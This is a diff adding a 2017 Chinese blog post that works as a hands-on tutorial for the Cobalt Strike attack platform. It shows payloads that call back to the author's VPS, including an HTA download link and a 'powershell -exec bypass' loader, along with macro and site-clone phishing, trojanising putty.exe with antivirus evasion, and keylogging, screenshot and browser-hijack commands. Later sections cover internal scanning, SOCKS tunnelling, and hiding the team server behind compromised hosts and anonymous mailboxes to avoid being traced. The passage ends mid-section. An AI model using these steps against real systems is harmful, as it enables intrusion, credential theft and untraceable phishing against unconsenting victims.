@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="cobalt strike 快速上手 [ 一 ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>cobalt strike 快速上手 [ 一 ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/09/23/cobalt-strike/">
+                cobalt strike 快速上手 [ 一 ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-09-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/cobalt-strike/">cobalt strike</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 关于 Cobalt Strike<br><figure class="highlight prolog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">一款非常优秀的后渗透平台 [ 谁用谁知道,嘿嘿……说不好用的唯一原因,可能就是很多用法还没有被自己挖掘出来,因为不会用,所以,才会感觉不好用 ]</div><div class="line">工具基于java,大部分功能在改进的基础上还是相对比较实用的,非常适合团队间协同作战</div><div class="line">更多详情请自行参考官网,这里就不啰嗦了,以下全部简称<span class="string">'cs'</span></div></pre></td></tr></table></figure></p>
+<p>0x02 基础环境简介:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">kali 	  		实际控制端		<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.144</span></div><div class="line">ubuntu <span class="number">16.04</span> 		自己公网的vps    	<span class="built_in">ip</span>:<span class="number">53.3</span><span class="meta">.3</span><span class="meta">.6</span>		</div><div class="line">win2008R2 		目标机器			<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.191</span></div><div class="line">centos6<span class="meta">.9</span> 		已控肉鸡			<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.199</span></div><div class="line">win7cn			另一台肉鸡		<span class="built_in">ip</span>:<span class="number">192.168</span><span class="meta">.1</span><span class="meta">.123</span></div></pre></td></tr></table></figure></p>
+<p>0x03 先来快速预览cs最基本的一些模块具体用途:</p>
+<p>团队服务器[teamserver]<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">主要是为了方便一个渗透团队内部能够及时共享所有成员的所有渗透信息,加强成员间的交流协作,以此提高渗透效率</div><div class="line">也就是说,正常情况下一个团队只需要起一个团队服务器即可,团队中的所有成员只需要拿着自己的cs客户端登录到团体服务器就能轻松实现协同作战</div><div class="line">当然,实际中可能为了尽可能久的维持住目标机器权限,还会习惯性的多开几个团队服务器,防止出现意外情况</div><div class="line">另外,团体服务器最好运行在linux平台上<span class="string">[本次演示所用的团队服务器系统为ubuntu 16.04]</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># ./teamserver 团队服务器ip 设置一个团队服务器密码<span class="string">[别人要用这个密码才能连进来]</span> 配置文件<span class="string">[一般默认即可]</span> <span class="string">[YYYY-MM-DD]</span></div><div class="line"># ./teamserver <span class="number">53.3.3.6</span> klion</div></pre></td></tr></table></figure>
+<p><img src="/img/teamviewer_start.png" alt="&#39;&#39;"><br></p>
+<p>客户端[cobaltstrike]<br>为了更好的说明效果,此处就分别模拟两个不同的客户端同时登陆到同一台团队服务器中,首先,先在本机运行客户端尝试登陆到团队器,客户端启动以后会提示你输入团队服务器的ip,端口和密码,用户名可随意<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ./cobaltstrike</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/teamviewer_client.png" alt="&#39;&#39;"><br></p>
+<p>接着,再到另一台kali机器上打开客户端登陆登录到同一团队服务器,最终实现的效果如下,团队成员可以通过event相互沟通,也可通过event清晰看到团队中的其它成员在什么时间都干了些什么,非常详细直观:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ./cobaltstrike</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/teamviewer_client2.png" alt="&#39;&#39;"><br><img src="/img/teamviewer_client_hello.png" alt="&#39;&#39;"><br></p>
+<p>使用cs的各种监听器<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">其实,监听器的作用很简单,主要是为了接受payload回传的各类数据,</div><div class="line">比如,我们的payload在目标机器执行以后,会回连到监听器然后下载执行真正的shellcode代码,其实跟msf中<span class="keyword">handler</span>的作用基本是一致的</div></pre></td></tr></table></figure></p>
+<p>在cs中的监听器有两种,一种是beacon,另一种是foreign<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">beacon  为<span class="keyword">cs</span>内置监听器,也就是说,当我们在目标系统成功执行payload以后,会弹回一个beacon的<span class="keyword">shell</span>给<span class="keyword">cs</span>,该<span class="keyword">shell</span>所支持的通信协议主要包括这几种,dns,https,http,smb[pipe],另外,beacon <span class="keyword">shell</span>的内置功能也非常多,后面我们会再详细说</div><div class="line">foreign 主要是提供给外部使用的一些监听器,比如你想利用<span class="keyword">cs</span>派生一个meterpreter的<span class="keyword">shell</span>回来,来继续后面的内网渗透,这时就选择使用外部监听器</div></pre></td></tr></table></figure></p>
+<p>再来简单演示下,如何快速创建一个监听器,具体过程如下<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">点击左上角的Cobalt Strike菜单 </div><div class="line">  -&gt; 选中Listeners </div><div class="line">    -&gt; 接着点击<span class="keyword">Add</span><span class="bash">按钮会自动跳出监听器的配置框 </span></div><div class="line">      -&gt; 设置好端口ip [ 实际中最好用域名(走dns隧道) ]和payload类型即可创建,之后,团队服务器会一直监听该端口等待beacon <span class="keyword">shell</span><span class="bash">回连的数据</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/listener_view.png" alt="&#39;&#39;"><br><img src="/img/listener.png" alt="&#39;&#39;"><br><img src="/img/listener1.png" alt="&#39;&#39;"></p>
+<p>说完监听器,最后,我们再来说payload [攻击载荷]<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">说白点儿其实就是个木马下载器,当目标触发payload以后,会自动去下载shellcode[其实就是beacon <span class="keyword">shell</span><span class="bash">的代码]到目标系统中运行,最后成功弹回目标系统的beacon shell,</span></div><div class="line">至于在beacon <span class="keyword">shell</span><span class="bash">执行的指令都是按照计划任务来的,也就是说被控端会按事先规定好的时间自动去控制端下载各种指令任务依次在目标系统中执行</span></div></pre></td></tr></table></figure></p>
+<p>首先,我们先来简单创建个payload,然后直接把它丢到目标系统中执行,看看实际的上线效果到底是个什么样子,注意,这里带红爪子的是已经拿到系统最高权限的,没爪子的基本都是系统权限暂时还比较低的<br><img src="/img/winexec.png" alt="&#39;&#39;"><br><img src="/img/winexec_res.png" alt="&#39;&#39;"><br><img src="/img/windows dropper_save.png" alt="&#39;&#39;"><br><img src="/img/payload_res_upload.png" alt="&#39;&#39;"><br></p>
+<p>0x04 丰富的客户端攻击选项<br>首先,尝试利用 ‘System Profiler’ 模块,搜集目标的各类机器信息,比如,目标用的什么版本的操作系统,什么浏览器,详细版本是多少,有没有装flash,flash具体版本又是多少[低版本可以挂马],看能不能看到目标内网ip段,大概目测估计下目标内网有多大,有了这些基础信息以后,后期我们就可以针对性的写信发信,还是那句话,实际中最好用域名,因为这里是实验所以才直接用的ip,发信时最好用html伪装个比较”到位”的链接,关于写信发信又是另一个比较’专业’的技术点,个人能力有限,这里暂不涉及,嘿嘿……下面就给大家简单的看下实际的效果<br><img src="/img/system profiler.png" alt="&#39;&#39;"><br><img src="/img/system profiler_res.png" alt="&#39;&#39;"><br><img src="/img/system profiler_res_succeed.png" alt="&#39;&#39;"><br></p>
+<p>利用’hta payload’配合’文件下载’模块向目标发送各种钓鱼链接,首先,创建一个hta的payload,这里的payload暂时只支持三种可执行格式,exe,powershell和vba(宏),实际中更推荐用powershell,成功率相对较高,好处就不多说了,免杀,灵活…<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http:<span class="regexp">//</span><span class="number">53.3</span>.<span class="number">3.6</span>:<span class="number">80</span><span class="regexp">/download/</span>plugins.hta</div></pre></td></tr></table></figure></p>
+<p><img src="/img/hta_attack.png" alt="&#39;&#39;"><br><img src="/img/hta_attack_powershell.png" alt="&#39;&#39;"><br><img src="/img/hta_attack_svae.png" alt="&#39;&#39;"><br><img src="/img/hta_attack_link.png" alt="&#39;&#39;"><br><img src="/img/hta_attack_svae_res.png" alt="&#39;&#39;"><br><img src="/img/hta_attack_svae_run.png" alt="&#39;&#39;"><br><img src="/img/hta_attack_svae_run_res.png" alt="&#39;&#39;"><br></p>
+<p>生成基于各类语言的shellcode,如,c,c#,java,python,powershell,ruby,raw,另外,cs也提供了可直接配合veil一起使用的选项,这里还是以最实用的powershell为例,生成好以后,想办法把脚本载入到目标系统中,这里就直接在目标cmd中载入了,实际中你可以把这个代码单独扣出来放到任何能执行ps的地方<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> powershell –<span class="built_in">exec</span> bypass –Command <span class="string">"&amp; &#123;Import-Module 'C:\payload.ps1'&#125;"</span></span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/payload_gent_powershell.png" alt="&#39;&#39;"><br><img src="/img/payload_gent_powershell_save.png" alt="&#39;&#39;"><br><img src="/img/payload_gent_powershell_res.png" alt="&#39;&#39;"><br></p>
+<p>尝试利用office宏钓鱼,并不推荐直接这样搞,因为office默认是不启用宏的,不过,可以尝试配合利用一些已经爆出来的相对比较新office 0day来搞,注意平时自己用office一定要禁用无数字签证的宏,切莫信任vba<br><img src="/img/macro.png" alt="&#39;&#39;"><br><img src="/img/macro_word.png" alt="&#39;&#39;"><br><img src="/img/macro_word_gen.png" alt="&#39;&#39;"><br><img src="/img/macro_word_gen_copy.png" alt="&#39;&#39;"><br><img src="/img/macro_word_gen_exec.png" alt="&#39;&#39;"><br><img src="/img/macro_word_gen_succeed.png" alt="&#39;&#39;"><br></p>
+<p>尝试向正常的exe中嵌入payload,不过,捆绑完以后的exe图标可能会被改变,你可以尝试把原来的putty.exe的图标给扣出来,然后再替换下,好好处理下免杀,之后问题基本就不太大了,从下图可以清晰地看到,当正常的程序执行完以后,我们的payload也一并被执行了[其实payload是先执行的]<br><img src="/img/windows dropper.png" alt="&#39;&#39;"><br><img src="/img/windows dropper_save.png" alt="&#39;&#39;"><br><img src="/img/windows dropper_putty.png" alt="&#39;&#39;"><br><img src="/img/windows dropper_netstat.png" alt="&#39;&#39;"><br><img src="/img/windows dropper_netstat_res.png" alt="&#39;&#39;"><br></p>
+<p>生成传统的usb自运行payload,你需要提供一个payload[这个可以直接用cs生成,不过不免杀,最好还是用你自己处理好的马来搞]即可,官方说,对xp之前的系统最好使,win7以后的系统基本废掉了,实用性并不大,所以这里也就不详细说了<br><img src="/img/usb_autopaly.png" alt="&#39;&#39;"><br></p>
+<p>至于生成常规的exe payload就很简单了,指定下要挂到哪个监听器上,然后给个命中率比较高的名字保存一下,把生成的可执行文件想办法丢到目标机器上执行下,非常简单,这里就不多啰嗦了<br><img src="/img/win_exec.png" alt="&#39;&#39;"><br></p>
+<p>克隆目标网站针对性挂马,提供一个你想克隆的网站,然后配好自己的url[模仿的尽量跟目标的像一点],然后带上你要执行的payload,这里的payload可以直接用msf生成,也可以像我这样用hta,当然啦,实际中这个payload肯定是精心处理过的,机会来之不易,肯定不会瞎搞,还是那句话实际写信最好用html方便把那个url给处理的更逼真<br><img src="/img/site_clone.png" alt="&#39;&#39;"><br><img src="/img/site_clone_res.png" alt="&#39;&#39;"><br><img src="/img/site_clone_res_run.png" alt="&#39;&#39;"><br><img src="/img/site_clone_res_upload.png" alt="&#39;&#39;"><br></p>
+<p>‘PowerShell Web Delivery’可能也是大家平时用的最多的功能模块了,其实,它就相当于msf中的web_delivery模块,会生成一段shellcode代码,然后会提供给你一个下载器,这样你就可以把这个下载器插到任何能运行powershell且能正常上网的地方,比如,典型的 chm,快捷方式……,因为只是实验,我就直接丢到目标系统的cmd中执行了<br><img src="/img/delivery.png" alt="&#39;&#39;"><br><img src="/img/delivery_res.png" alt="&#39;&#39;"><br><img src="/img/delivery_exe.png" alt="&#39;&#39;"><br><img src="/img/delivery_exe_res.png" alt="&#39;&#39;"><br></p>
+<p>发垃圾邮件,先把所有的目标邮箱放到一个文件中[注意,每行对应一个],然后再去找个准备用来钓鱼的邮件[直接查看原文,把html整个粘出来],写完信以后记得先预览下,看看实际效果,然后再配置好用来发送邮件的公共邮件服务器,这里本来想用protonmail邮箱服务器来发的,后来看到官方说因为加密的原因暂不支持常规的IMAP,POP3,SMTP,无奈,这里就先不演示了,非常简单,实际不明白也可以私信我……,另外,实际中大家最好用手中已有的各种匿名邮箱来发[反正只要不泄露私人信息会容易被人追踪到的邮箱都可以],这很重要……切记,图貌似给贴错了,汗……大家懂我意思就行<br><img src="/img/SPEAR Phish.png" alt="&#39;&#39;"><br><img src="/img/mail_server_set.png" alt="&#39;&#39;"><br></p>
+<p>常规java攻击,有版本限制,而且要买证书,实际渗透中,其实前面这些基本就已经够用了,所以这里就不重点说了</p>
+<p>0x05 通过上面这些方法,相信此时的你已经搞到了一个beacon的shell,下面我们就来详细说明关于beacon shell自身的基本使用[后渗透阶段],先假设我们拿到的是一个还没有bypass掉uac之前的’管理员’权限的beacon shell,以此来进行后续的一些基本操作,需要事先说明一下cs对中文的支持并不好,如果目标是中文系统,有乱码是肯定的<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">help</span> 			查看beacon <span class="keyword">shell</span>所有内置命令帮助,如果想查看指定命令的用法,可以这样,<span class="keyword">e</span><span class="variable">g:</span> <span class="keyword">help</span> checkin</div><div class="line">note 			给当前目录机器起个名字, <span class="keyword">e</span><span class="variable">g:</span> note beacon-<span class="keyword">shell</span></div><div class="line"><span class="keyword">cd</span>			在目标系统中切换目录,注意在win系统中切换目录要用双反斜杠,或者直接用<span class="string">'/'</span> <span class="keyword">e</span><span class="variable">g:</span> <span class="keyword">cd</span> <span class="keyword">c</span>:\\</div><div class="line"><span class="built_in">mkdir</span> 			新建目录, <span class="keyword">e</span><span class="variable">g:</span> <span class="built_in">mkdir</span> d:\\beacon</div><div class="line">rm 			删除文件或目录, <span class="keyword">e</span><span class="variable">g:</span> rm d:\\beacon</div><div class="line">upload 			上传文件到目标系统中</div><div class="line">download		从目标系统下载指定文件,<span class="keyword">e</span><span class="variable">g:</span> download C:\\Users\\win7cn\\Desktop\\putty.<span class="keyword">exe</span></div><div class="line">cancel			取消下载任务,比如,一个文件如果特别大,下载可能会非常耗时,假如中途你不想继续下了,就可以用这个取消一下</div><div class="line"><span class="keyword">shell</span>			在目标系统中执行指定的cmd命令, <span class="keyword">e</span><span class="variable">g:</span> <span class="keyword">shell</span> whoami</div><div class="line">getuid 			查看当前beacon 会话在目标系统中的用户权限,可能需要bypassuac或者提权</div><div class="line"><span class="keyword">pwd</span>			查看当前在目录系统中的路径</div><div class="line"><span class="keyword">ls</span>			列出当前目录下的所有文件和目录</div><div class="line">drives			列表出目标系统的所有分区[win中叫盘符]</div><div class="line"><span class="keyword">ps</span>			查看目标系统当前的所有的进程列表</div><div class="line">kill			杀掉指定进程, <span class="keyword">e</span><span class="variable">g:</span> kill <span class="number">4653</span></div><div class="line"><span class="keyword">sleep</span> <span class="number">10</span>		指定被控端休眠时间,默认<span class="number">60</span>秒一次回传,让被控端每<span class="number">10</span>秒来下载一次任务,实际中频率不宜过快,容易被发现,<span class="number">80</span>左右一次即可</div><div class="line">jobs			列出所有的任务列表,有些任务执行时间可能稍微较长,此时就可以从任务列表中看到其所对应的具体任务id,针对性的清除</div><div class="line">jobkill			如果发现任务不知是何原因长时间没有执行或者异常,可尝试用此命令直接结束该任务, <span class="keyword">e</span><span class="variable">g:</span> jobkill <span class="number">1345</span></div><div class="line">clear			清除beacon内部的任务队列</div><div class="line">checkin			强制让被控端回连一次</div><div class="line"><span class="keyword">exit</span> 			终止当前beacon 会话</div><div class="line">ctrl + <span class="keyword">k</span> 		清屏</div></pre></td></tr></table></figure></p>
+<p>0x06 搜集目标机器上的各类信息[有些可能会触发敏感api导致防护报警,另外进程注入,被控端可能感到非常明显的卡顿,工具也有许多不完善的地方]:<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在目标系统中放置常规键盘记录, <span class="string">eg:</span> keylogger <span class="number">1796</span> x86</div></pre></td></tr></table></figure></p>
+<p><img src="/img/keylogger.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">尝试在目标系统中截屏,可能会造成目标系统有很明显的卡顿,<span class="string">eg:</span> screenshot <span class="number">1796</span> x86 <span class="number">10</span>		截取<span class="number">10</span>秒</div></pre></td></tr></table></figure>
+<p><img src="/img/screenshot.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">利用web代理,劫持转发目标浏览器进程数据到指定的端口上,然后我们再从该端口访问,就相当于拿着目标的浏览器中的数据访问</div><div class="line">比如,我们通过截屏发现他登录某个需要账号密码的站点,通过浏览器代理我就可以实现无密码直接登录他所登录的那个站点,我表达能力不好,相信大家应该都懂我意思</div><div class="line">官方说暂时只对IE好使,而且还不稳定,成功率一半一半吧,估计是<span class="keyword">dump</span>进程数据的原因,<span class="keyword">dump</span>瞬间可能会造成目标浏览器巨卡</div><div class="line">不过不得不说这个想法还是非常好的,只是功能目前做的 [ 这里膜拜下作者,大写的赞] ,还不是特别完善,走投无路的情况下可以尝试下</div></pre></td></tr></table></figure>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">browserpivot </span><span class="number">1460</span> x86</div><div class="line"><span class="keyword">browserpivot </span>stop</div></pre></td></tr></table></figure>
+<p><img src="/img/browersploit.png" alt="&#39;&#39;"><br><img src="/img/browersploit_run.png" alt="&#39;&#39;"><br><img src="/img/browersploit_proxy.png" alt="&#39;&#39;"><br><img src="/img/browersploit_res.png" alt="&#39;&#39;"><br></p>
+<p>域内渗透相关模块,其实,如果真是域内渗透,我们可以暂时不用这么搞,后续再单独说<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">kerberos_ccache_use    从ccache文件中导入票据</div><div class="line">kerberos_ticket_purge  清除当前<span class="keyword">shell</span><span class="bash">的票据</span></div><div class="line">kerberos_ticket_use    从ticket文件中导入票据</div></pre></td></tr></table></figure></p>
+<p>0x07 通过各种powershell渗透框架来增强cs的实用性,如,nishang,empire,PowerSploit,powerup,Sherlock……续的,提权,bypassuac,dll注入,抓hash,pth……都是一模一样的用法,核心还是在那些脚本上,关于各类powershell框架的具体用法,请关注博客相关文章,这里就不一一演示了,就简单说一下用法,当然,beacon shell自身也提供了类似的功能,只是我没有说,但实际中那个可能还远远不够,而且它自身的工具工作的也不是非常好,所以更推荐大家尤其是在win内网渗透中,尽可能全部用powershell来搞<br>第一种方式,在beacon shell中导入外部ps脚本到远程机器上<br><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">powershell-import /root/Desktop/<span class="keyword">Get</span>-<span class="keyword">Information</span>.ps1</div><div class="line">powershell <span class="keyword">Get</span>-<span class="keyword">Information</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/powershell-import_getinfo.png" alt="&#39;&#39;"></p>
+<p>第二种方式,在beacon shell中直接执行powershell代码<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">powerpick</span> <span class="meta">Get</span>-Host</div></pre></td></tr></table></figure></p>
+<p><img src="/img/powerpick.png" alt="&#39;&#39;"><br></p>
+<p>0x08 利用cs灵活穿透目标内网</p>
+<p>对目标机器所在的内网进行常规端口扫描,指定ip段,指定用于扫描的协议[暂只支持arp,icmp,tcp],指定线程[切记实际中不要开的太高]<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">portscan <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> <span class="number">1</span><span class="number">-6000</span> arp <span class="number">10</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/portscan.png" alt="&#39;&#39;"><br></p>
+<p>becon shell内置的端口转发功能,把本机的某个端口转到公网或者内网指定机器的某个端口上,实际用的时候速度确实比较慢,而且经常断……原因暂未知<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rportfwd <span class="number">389</span> <span class="number">192.168</span><span class="number">.1</span><span class="number">.181</span> <span class="number">3389</span></div><div class="line">rportfwd stop <span class="number">389</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/rportfw.png" alt="&#39;&#39;"><br><img src="/img/rportfw_res.png" alt="&#39;&#39;"><br></p>
+<p>让cs和msf相互间联动使用,在目标机器上开启socks4a代理,方便进一步的内网渗透</p>
+<p>第一种,利用各种socks代理客户端直接把各类渗透工具带进目标内网<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">beacon&gt;<span class="built_in"> socks </span>1234</div></pre></td></tr></table></figure></p>
+<p><img src="/img/socks4a_start.png" alt="&#39;&#39;"><br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"># vi /etc/proxychains.conf	</div><div class="line">  socks4 <span class="number">53.3</span><span class="number">.3</span><span class="number">.6</span> <span class="number">1234</span></div><div class="line"># socks stop</div></pre></td></tr></table></figure></p>
+<p><img src="/img/socks4a.png" alt="&#39;&#39;"><br></p>
+<p>第二种,直接利用隧道直接把整个msf带进目标内网<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">setg</span> Proxies socks4:<span class="number">53.3</span><span class="meta">.3</span><span class="meta">.6</span>:<span class="number">1234</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/socks4a_tunnel.png" alt="&#39;&#39;"><br><img src="/img/socks4a_ms.png" alt="&#39;&#39;"><br></p>
+<p>利用beacon shell连接内网中的linux机器<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">ssh</span> 192<span class="selector-class">.168</span><span class="selector-class">.1</span><span class="selector-class">.199</span><span class="selector-pseudo">:22</span> <span class="selector-tag">root</span> <span class="selector-tag">admin</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/cobalt_ssh.png" alt="&#39;&#39;"><br></p>
+<p>通过beacon隧道直接派生一个meterpreter的shell[非vps上做中转,直接通过beacon隧道过来],流程很简单,首先,在团体服务器上做端口转发,然后创建一个外部监听器,端口和ip写beacon shell的机器所在的ip,然后在对应的beacon shell中’spawn’选中刚刚创建好的外部监听器,暂时还有些问题没有很好的解决,后面单独说</p>
+<p>至于如何利用msf弹回一个beacon shell的方法就很多了,最简单的方法就是直接执行下beacon的payload的代码就可以了,又忘贴图了,汗……后期再补上来吧</p>
+<p>0x09 配合常规端口转发尽可能隐藏自己的团队服务器<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">有时为了混淆视听,防止被别人快速溯源到,可能会在中间加一些跳板来尽可能隐藏我们真实的团队服务器位置,怎么做呢,其实很简单</div><div class="line">说白点就是做端口转发<span class="string">[又名重定向]</span>,当然啦,这个端口转发肯定是在自己已有的肉鸡上做<span class="string">[论匿名的重要性]</span></div><div class="line">如果你实在不放心,也可以尝试同时在多个肉鸡上,做多级转发<span class="string">[也就是多加几层跳板]</span>,以此来迷惑对方,加大对手的溯源难度,这是其一</div></pre></td></tr></table></figure></p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">还有些目标内网中的某些机器是没法正常直连公网的,只能内网机器间相互访问,但我们还是想让那台不能上网的机器也能正常上线</div><div class="line">这就要用到我们马上要说的端口转发,至于具体用什么工具自然就非常多了,不过,还是推荐大家首选一些系统自带工具来搞,比如,netsh,iptables,socat之流……</div><div class="line">这样,你好,我也好 ^<span class="keyword">_</span>^</div><div class="line">下面就用socat来简单演示下如何尽可能隐藏自己的团队服务器,关于内网断网机器上线也是一模一样的道理,大家可自行尝试</div></pre></td></tr></table></figure>
